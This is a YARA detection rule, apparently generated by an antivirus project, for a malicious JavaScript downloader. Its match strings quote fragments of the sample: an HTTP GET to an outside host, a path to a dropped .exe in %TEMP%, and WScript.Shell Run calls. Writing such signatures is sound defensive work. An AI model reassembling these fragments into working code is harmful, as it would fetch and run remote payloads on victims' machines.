rule sig_20160329_d9433167b213545fc69708e6e4baa1d5 {
  meta:
    description = "datamaliciousorder - file 20160329_d9433167b213545fc69708e6e4baa1d5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ac4e07c1d99862434c7c33913d7f2633d953b20ae64995872a1425e6f127f9c2"

  strings:
    $s1  = "y0[N](\"GET\", \"http://zilton.com/o9qwp\", false);" fullword ascii
    $s2  = "function dM() {return U[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"suyESTESlFvMv.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[k0](OF() * 11); if (y0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function W(Ae, eG){b0 = b0 * 1; return Ae - eG;};" fullword ascii
    $s5  = "var U = function i() {return WScript[gr](\"WScript.Shell\");}(), G = 11;" fullword ascii
    $s6  = "function aB(){return \"\" + O;};" fullword ascii
    $s7  = "function b(d){U[\"Run\"](d, b0, b0);};" fullword ascii
    $s8  = "function jd() {return ((nu == true) && (nu == Qq)) ? 1 : b0;};" fullword ascii
    $s9  = "function k()" fullword ascii
    $s10 = "function OF(){return 22;};" fullword ascii
    $s11 = " while (kN){" fullword ascii
    $s12 = "var dZ = new this[\"Date\"]();" fullword ascii
    $s13 = "return W(r0, aj);" fullword ascii
    $s14 = "function K(S) {var c = (1, 2, 3, 4, 5, S); return c;};" fullword ascii
    $s15 = "function x(){return gr;};" fullword ascii
    $s16 = "Qq = true; " fullword ascii
    $s17 = "nu = true; " fullword ascii
    $s18 = "var z = false;" fullword ascii
    $s19 = "var Qq = false;" fullword ascii
    $s20 = "var nu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}